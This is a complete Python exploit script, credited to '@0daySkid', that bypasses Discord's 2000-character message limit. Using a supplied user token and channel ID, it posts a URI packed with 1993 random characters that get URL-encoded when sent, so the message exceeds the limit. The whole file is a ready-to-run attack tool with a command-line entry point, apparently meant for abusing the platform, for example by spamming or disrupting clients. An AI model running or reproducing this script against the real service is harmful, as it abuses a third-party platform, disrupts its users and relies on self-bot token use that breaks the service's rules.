# Name: 2000 Characters Limit Bypass
# Description: Sends an URI that contains characters that gets URL encoded when sent, which increases the length of the message.
# Author: checksum (@0daySkid)
# Original founder: Siaxos

import requests
import random
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}

    @property
    def uri(self):
        chars = ''.join(random.choice('\'"^`|{}') for _ in range(1993))
        return f'<a://a{chars}>'

    def execute(self):
        """ send magical URI """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': self.uri})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
